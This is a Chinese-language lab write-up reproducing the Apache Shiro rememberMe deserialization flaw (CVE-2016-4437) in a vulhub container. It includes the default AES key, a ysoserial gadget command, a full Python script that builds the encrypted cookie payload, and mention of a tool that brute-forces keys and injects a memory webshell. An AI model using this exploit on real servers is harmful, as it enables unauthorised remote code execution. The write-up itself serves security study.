# shiro反序列化漏洞(CVE-2016-4437)漏洞复现

Apache Shiro是一款开源强大且易用的Java安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。

在 1.2.4 版本前, 加密的用户信息序列化后存储在名为remember-me的Cookie中，Apache Shiro默认使用CookieRememberMeManager。其处理cookie的流程是：得到rememberMe的cookie值-->Base64解码-->AES解密-->反序列化，默认ASE秘钥,Key: kPH+bIxk5D2deZiIxcaaaA==

***shiro特征指纹***

> 随便输入账号密码，在返回包的 Set-Cookie 中存在 rememberMe=deleteMe 字段

### 漏洞影响

shiro<1.2.4

### 环境搭建

```cobol
cd /vulhub-master/shiro/CVE-2016-4437
CVE-2016-4437# docker-compose up -d
```

### 漏洞复现

访问对应地址，随便输入账号密码，bp抓包重发，可观察到`rememberMe=deleteMe`字样，基本可以确定网站是Apache Shiro搭建。

![image-20250315122426385](C:\Users\21415\AppData\Roaming\Typora\typora-user-images\image-20250315122426385.png)

![image-20250315122212433](C:\Users\21415\AppData\Roaming\Typora\typora-user-images\image-20250315122212433.png)

1. 手工漏洞利用

​	使用ysoserial生成CommonsBeanutils1的Gadget：

> java -jar ysoserial-master-30099844c6-1.jar CommonsBeanutils1 "touch /tmp/success" > poc.ser

​	payload生成代码（python3），命名为poc.py

``` import sys
import uuid
import base64
from Crypto.Cipher import AES
 
def encode_rememberme():
    f = open('poc.ser','rb')
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
    iv = uuid.uuid4().bytes
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    file_body = pad(f.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext
 
if __name__ == '__main__':
    payload = encode_rememberme()   
    print("rememberMe={0}".format(payload.decode()))
```

​	再用此生成poyload，如下

![image-20250315160855438](C:\Users\21415\AppData\Roaming\Typora\typora-user-images\image-20250315160855438.png)

将该poyload放入cookie中，再发送，观察到响应包多个rememberme=deleteme

![image-20250315161313208](C:\Users\21415\AppData\Roaming\Typora\typora-user-images\image-20250315161313208.png)

​	进入靶机，查看生成的文件，可见touch /tmp/succ123命令已执行

```docker ps
docker exec -it a32221cbfee0 /bin/bash
cd /tmp
ls
```

![image-20250315161725470](C:\Users\21415\AppData\Roaming\Typora\typora-user-images\image-20250315161725470.png)

2. 工具利用

   工具地址：https://github.com/j1anFen/shiro_attack

​	检测是否存在漏洞并且爆破密钥

![image-20250315165123620](C:\Users\21415\AppData\Roaming\Typora\typora-user-images\image-20250315165123620.png)

爆破利用链及回显，进一步利用

![image-20250315165636699](C:\Users\21415\AppData\Roaming\Typora\typora-user-images\image-20250315165636699.png)

![image-20250315165728003](C:\Users\21415\AppData\Roaming\Typora\typora-user-images\image-20250315165728003.png)

注入内存马，发现冰蝎连不上

![image-20250315165916315](C:\Users\21415\AppData\Roaming\Typora\typora-user-images\image-20250315165916315.png)





### 参考链接

* https://blog.csdn.net/HEAVEN569/article/details/125389987
* https://github.com/vulhub/vulhub/blob/master/shiro/CVE-2016-4437/README.zh-cn.md

